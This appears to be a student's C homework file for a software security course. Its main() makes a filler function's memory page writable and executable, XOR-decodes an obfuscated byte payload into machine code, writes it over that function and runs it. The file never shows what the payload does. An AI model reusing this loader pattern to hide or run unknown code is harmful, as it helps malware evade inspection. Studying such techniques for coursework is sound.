/// CS492e homework.
// 20226189 - KAU Anthony Mathieu

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

void dummy(void) {
    
    int i=0;
    i++;
    printf("%d: you should put enough dummy code here\n", i);
    i++;
    printf("%d: in order to safely overwrite it with your own\n", i);

    for(int iterator = 0; iterator <= 500; iterator++){
        printf("We are in the iteration : %d of the for loop \n", iterator);

        if (iterator == 4){
            printf("That's not a lucky number in china\n");
        }
        else if (iterator == 13){
            printf("Hope it is not a friday\n");
        }
        
        else if (iterator == 42){
            printf("Is this number the answer to everything ?\n");
        }
        else if (iterator == 50){
            printf("1/10 of the loop has been done already\n");
        }
        else if (iterator == 66){
            printf("Famous road in the united States\n");
        }
        else if (iterator == 77){
            printf("Let's make an insertion sort in ascending order\n");
            int array1[] = {4, 13, 99, 50, 10, -10, 777, 100, 1, 492, 42};
            int size1 = sizeof(array1) / sizeof(array1[0]);
            
            int iter, temp, j;
            for (iter = 1; iter < size1; iter++){
                temp = array1[iter];
                j = iter - 1;

                while (j >= 0 && array1[j] > temp){
                    array1[j + 1] = array1[j];
                    j = j - 1;
                }
                array1[j+1] = temp;
            }

            for (iter = 0; iter < size1; iter++){
                printf("%d ", array1[iter]);
            }
            printf("\n");
        }
        else if (iterator == 100){
            printf("2/10 of the loop has been done already\n");
        }
        
        else if (iterator == 125){
            printf("What is this ?\n");

            int n = iterator;
            while(n > 1){
                if(n % 2 == 0){
                    n = n / 2;
                    printf("%d\n", n);
                }
                else{
                    n = n * 3 + 1;
                    printf("%d\n", n);
                }
            }
        }
        else if (iterator == 150){
            printf("3/10 of the loop has been done\n");

        }
        else if (iterator == 177){
            printf("Time for bubble sort\n");
            int array2[] = {54, 52, 12, 64, 754, 231, 342, 6432, 10, 1231};
            int size2 = sizeof(array2) / sizeof(array2[0]);
            
            for (int step = 0; step < size2 - 1; step++){
                for (int i = 0; i < size2 - step - 1; i++){
                    if (array2[i] > array2[i + 1]){
                        int temp2 = array2[i];
                        array2[i] = array2[i+1];
                        array2[i+1] = temp2;
                    }
                }
                
            }
            for (int i = 0; i < size2; ++i) {
                printf("%d  ", array2[i]);
            }
            printf("\n");
        }
        else if (iterator == 200){
            printf("4/10 of the loop has been done\n");

        }
        else if (iterator == 225){
            if (iterator >= 10){
                printf("What is the point of this condition ?");
            }

        }
        else if (iterator == 250){
            printf("halfway done done\n");
        }
        else if (iterator == 277){
            printf("Let's calculate some factorial\n");
            unsigned long long fact = 1;
            int n = 5;
            for (i = 1; i <= n; i++){
                fact *= i;
            }
            printf("Factorial of %d = %llu\n", n, fact);
        }
        else if (iterator == 300){
            printf("6/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the area of a square\n");
            float side, area;
            side = 10;
            area = side * side;
            printf("Area of square of side %f is %0.04f\n ", side, area);

        }
        else if (iterator == 350){
            printf("7/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the sum of the Natural numbers for this iter\n");
            int sum;
            for (i = 1; i <= iterator; i++){
                sum += i;
            }
            printf("Sum of the naturals numbers to %d is %d", iterator, sum);
        }
        else if (iterator == 400){
            printf("8/10 of the loop has been done\n");

        }
        else if (iterator == 444){
            printf("After the square, here comes the rectangle\n");
            float length, width, area2;
            length = 10;
            width = 15;
            area2 = length * width;
            printf("Area of rectangle of length = %f and width = %f is %f\n", length, width, area2);
        }
        else if (iterator == 450){
            printf("9/10 of the loop has been done\n");

        }
        else if (iterator == 492){
            printf("Softsec is really hard !\n");

        }
        else if (iterator == 500){
            printf("Wow looks like we are done\n");

        }
        
    }
}

int make_writable(void *addr) {
    int page_size = getpagesize();
    addr -= (unsigned long)addr % page_size;

    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return -1;
    }

    return 0;
}

int main(void) {
    void *dummy_addr = (void*)dummy;

    if(make_writable(dummy_addr) == -1) {
        fprintf(stderr, "Failed to change perm.\n");
        return 1;
    }

    unsigned char randombytes[] =
        "\xc2\x3b\xa8\xba\xdd\x57\x83\x08\xac\x89\x91\xd4\x68\x81\x8e\x0f"
        "\xd3\x7e\xcd\x75\x1c\x90\x0a\x68\x1f\xee\xed\x70\x92\xf7\x7b\xd8"
        "\xd4\x32\x32\x9b\xaa\x83\x1d\x9f\x76\x5c\xec\x2b\x48\xd3\x8a\xc6"
        "\xfa\xe2\xe5\xf9\x4f\x28\x26\x84\x5a\x02\x0a\xc0\x9b\x00\xbf\x6f"
        "\xf4\xeb\xa5\xa8\xd7\x23\x34\xb5\xa1\xad\x6d\xa3\xe5\xde\xd4\xf5"
        "\xb4\x0f\x2b\x22\xe7\x35\x3b\xa9\xab\xe1\x06\x1a\xa7\x53\x63\x26"
        "\x47\x13\x23\x55\x02\xcf\xad\x10\xd3\x6d\x09\x3c\xef\x81\x78\x6f"
        "\x30\x8b\xe8\x1a\xd9\x79\x77\x55\x52\xca\xfe\xcb\xcf\xc9\x9a\xb8"
        "\x86\x2b\x4f\x0d\x8e\xa1\x6d\xde\x8c\xa5\x3e\xbf\xf6\x76\x8a\x11"
        "\xee\xa5\xbe\x83\x66\x7f\x23\x53\xec\xa7\x63\xcf\x13\x78\xdc\x26"
        "\x50\xe1\x0f\x0f\x27\xad\x65\x85\x0a\x87\x76\xad\xc6\xc1\x6e\xdf"
        "\xca\x80\xf2\x3e\x8f\x70\xb7\x76\xce\x31\xa2\x71\x5c\x77\xe1\x82"
        "\x9e\x89\xef\xa9\x84\x20\x31\x33\xf5\x65\xd2\xfe\xb7\x6d\x11\xb6"
        "\xc6\xf9\x6c\x8f\x80\xb9\x44\xfa\xcf\x03\x46\xcd\x21\x8d\xc6\xd9"
        "\xc6\xa2\x7c\x7c\x79\x1b\x1f\xd6\xc5\xd2\x83\x2f\xdc\x24\xd1\x58"
        "\x85\xfa\x54\x86\x6f\xcb\x3d\x75\x6d\x19\xca\x3c\x58\x27\xf5\xb2"
        "\x67\x85\x57\x15\xcd\x82\xa9\x7d\x4e\xc0\x13\x53\x04\x36\xfc\x15"
        "\xd4\xed\xcc\x37\x5d\x1e\x67\x1a\x49\x94\x33\xf8\xa9\xea\xd0\x92"
        "\xe7\xca\x33\x9a\x7d\x82\x33\x30\x41\xe3\x24\x76\x3e\x00\x11\x6a"
        "\xe8\xc7\xc6\xb1\x9f\x40\x2e\xbd\x64\x4b\xf6\x33\x5d\xd9\xdf\x99"
        "\xd6\x17\xf0\x1f\x4a\x13\x41\x11\x5d\xa3\x19\x23\x4a\x35\xfc\xba"
        "\x65\x0a\x43\x22\xe4\x57\xe2\x3e\x2b\xdc\xdf\x1b\x8e\x82\x66\xc1"
        "\x28\xf3\x5d\x8b\xc5\x58\x3b\x61\xc3\xeb";

        int length2 = sizeof(randombytes)-1;
        //printf("size of randombytes is %d \n", length2);

        
        unsigned char xored[] =
        "\xF3\xFB\x99\x61\xEC\x9E\xB2\xDA\x1C\xED\xD1\x94\x2B\xEB\x88\x65"
        "\xD2\x14\xCF\xFC\xFD\x5D\x8A\xE1\xD8\x56\x1A\x82\x15\x0A\xC0\xA0"
        "\xDE\x93\x1B\xAA\x72\xD1\x4F\xCF\x10\x34\xEC\x7B\x2E\xB9\x88\x4F"
        "\x1C\xD3\x25\xC8\x94\x98\x40\x37\x59\x68\x1A\x96\xCC\x89\x5E\xA2"
        "\x74\xDA\x65\x99\x0C\x93\x52\x06\xA8\x14\xAA\xCF\x00\xB0\x6E\x3F"
        "\xD2\xE7\x4F\x13\x36\x64\x82\xEA\xBC\xE6\xE2\xA0\xCB\x75\x4A\xF2"
        "\x76\xC2\x72\xEC\x27\xD6\x75\x03\x69\x00\x44\xB0\xAC\xB0\xA9\x3E"
        "\x89\x05\x9B\x92\x70\xC3\x8D\x5E\xAE\x43\xCF\x1A\x9E\x70\xE8\xC8"
        "\x80\xDF\xF5\x46\xCC\xC2\xB7\xEF\x5D\xF4\x87\x41\x72\xED\x8B\xAB"
        "\x3F\x42\x56\xB6\x57\xAE\x72\xEA\xEF\x2B\x3D\xD6\xA9\x3C\x15\x2C"
        "\x69\xD0\xDE\x5E\xAE\x4B\x54\x4C\x3B\x55\x24\xC7\xDA\x97\x39\x56"
        "\x2B\x4D\x72\x0F\x4F\x41\x6C\x47\x07\x00\x70\x31\x1C\x37\x87\x38"
        "\xB9\x99\x66\x58\x0D\xDB\xFC\xB3\x7E\xEB\x25\xFE\xB7\x6D\x20\x76"
        "\xA0\x41\x5C\x85\xE6\x80\x8C\x8E\x8E\x32\x86\xFC\xFA\xBC\x0F\xE8"
        "\x14\x12\x74\x2E\x1F\xA2\xE0\xD7\xAD\xE6\xBA\x1D\xB9\x4C\xA1\x77"
        "\xE6\x89\x3C\xA9\x40\xBF\x50\xFC\x8E\xD4\x4A\x0D\x91\x97\xF0\x03"
        "\x65\xD6\x9A\x95\x44\x41\x19\x79\x26\xA3\x67\x36\x60\x5E\x95\x7B"
        "\xB2\x88\x45\xD6\xEF\x16\xAA\x9A\xA2\xDC\x02\x38\x98\x31\xE1\x5B"
        "\xD6\x18\x63\xF2\x49\xBB\x01\x55\x29\x93\x0B\x15\x4D\x68\x3E\x45"
        "\x9C\xAA\x4F\x52\xCC\xF0\x2B\x0C\x66\x86\x76\x59\x59\x52\xCB\xBD"
        "\xEF\xC7\x85\x01\x7B\xD3\x70\xCA\x6C\x6A\x28\xF1\xFA\x3F\xAD\xD2"
        "\x51\x33\x71\x47\x8C\x27\xCD\x5D\x58\xB4\xF0\x34\xFA\xEF\xEF\x22"
        "\xE5\x73\x6C\x4B\x75\x59\x88\x60\x0E\x6B";

        //int length3 = sizeof(xored)-1;
        //printf("size of xored is %d \n", length3);
    
        unsigned char realcode[length2];

        for(int i = 0; i < length2; i++){
            realcode[i] = (char)(randombytes[i] ^ xored[i]);
        }

    memcpy(dummy_addr, realcode, sizeof(realcode));

    dummy();
    return 0;
}
